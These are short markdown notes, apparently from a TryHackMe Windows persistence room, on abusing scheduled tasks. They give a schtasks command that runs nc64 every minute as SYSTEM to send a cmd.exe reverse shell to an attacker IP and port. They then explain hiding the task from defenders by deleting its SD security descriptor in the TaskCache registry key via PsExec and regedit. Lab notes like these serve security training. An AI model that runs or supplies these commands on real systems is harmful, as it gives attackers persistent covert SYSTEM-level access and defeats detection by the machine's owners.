# Windows Persistence - Abusing Scheduled Tasks

## Task scheduler

Create a scheduled task:
```powershell
 schtasks /create /sc minute /mo 1 /tn <taskname> /tr "c:\tools\nc64 -e cmd.exe $attacker_ip $port" /ru SYSTEM
```
Make it invisible by registery editing, using similar tool as [[Sysinternals-Psexec]]. The security descriptors of all scheduled tasks are stored in:
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`
To hide the task delete the `SD` value 

```powershell
PsExec64.exe -s -i regedit
```

## References

[THM Windows Persistence Room](https://tryhackme.com/room/windowslocalpersistence)